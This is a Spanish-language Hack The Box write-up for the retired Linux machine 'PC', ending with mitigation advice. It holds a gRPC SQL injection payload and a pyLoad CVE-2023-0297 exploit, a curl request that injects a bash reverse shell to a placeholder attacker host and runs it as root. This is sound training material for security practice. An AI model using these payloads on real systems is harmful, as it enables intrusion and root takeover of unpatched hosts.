---
machine: PC
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, grpc, sqli, pyload, cve, privesc]
---

# PC — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

El puerto 50051 es gRPC con reflexión activa. `grpcurl` enumera un servicio de login y una consulta SQLite inyectable que entrega credenciales de `sau`. Por SSH se llega al host; pyLoad 0.4.20 escucha en localhost y es vulnerable a CVE-2023-0297, lo que permite ejecutar comandos como root.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,50051 <IP>
```

- `22` SSH y `50051` un servicio desconocido.
- `grpcurl -plaintext <IP>:50051 list` confirma gRPC y la reflexión.
- El servicio se llama `PC` y expone métodos de login y consulta.

## Enumeración

- `grpcurl describe` muestra los mensajes `LoginRequest`, `Token` y `GetInfo`.
- El campo `username` del login se concatena en una consulta SQLite.
- Una inyección con `' OR 1=1--` devuelve un token y datos de usuarios.

```bash
grpcurl -plaintext <IP>:50051 list
grpcurl -plaintext -d '{"username":"admin'\'' OR 1=1--","password":"x"}' <IP>:50051 pc.PC/Login
```

## Foothold

Se enumeran las tablas con el token y se recupera el hash de `sau`. El hash se crackea y las credenciales funcionan por SSH.

```bash
grpcurl -plaintext -H 'token: <TOKEN>' -d '{"username":"sau"}' <IP>:50051 pc.PC/GetInfo
ssh sau@<IP>
```

## Movimiento lateral

`ss -tlnp` muestra pyLoad escuchando en `127.0.0.1:8000`. La versión 0.4.20 es vulnerable a CVE-2023-0297 en `js2py`.

```bash
ssh -L 8000:127.0.0.1:8000 sau@<IP>
```

## Escalada de privilegios

El endpoint `flash/addcrypted2` evalúa `jk` con `pyimport`; se inyecta una reverse shell y pyLoad la ejecuta como root.

```bash
curl -s 'http://127.0.0.1:8000/flash/addcrypted2' --data-urlencode 'jk=pyimport("os").system("bash -c \\"bash -i >& /dev/tcp/<ATTACKER>/443 0>&1\\"")'
```

## Evidencia

- gRPC con reflexión y métodos enumerados.
- SQLi en el login y credenciales de `sau`.
- pyLoad en localhost y CVE-2023-0297.
- Reverse shell como root.

## Lecciones aprendidas

- gRPC sin autenticación expone contratos y consultas internas.
- Un SQLi en un servicio ligero puede dar credenciales del sistema.
- Un servicio local antiguo puede ser la única vía de root.

## Mitigación y detección

- Requerir autenticación y deshabilitar reflexión en producción.
- Parametrizar consultas y validar los mensajes gRPC.
- Actualizar pyLoad y no ejecutarlo como root.

## Referencias

- [0xdf — PC](https://0xdf.gitlab.io/2023/10/07/htb-pc.html)
- [IppSec — PC](https://www.youtube.com/watch?v=AQSLvalzW8g)
- [Hack The Box — PC](https://app.hackthebox.com/machines/pc)
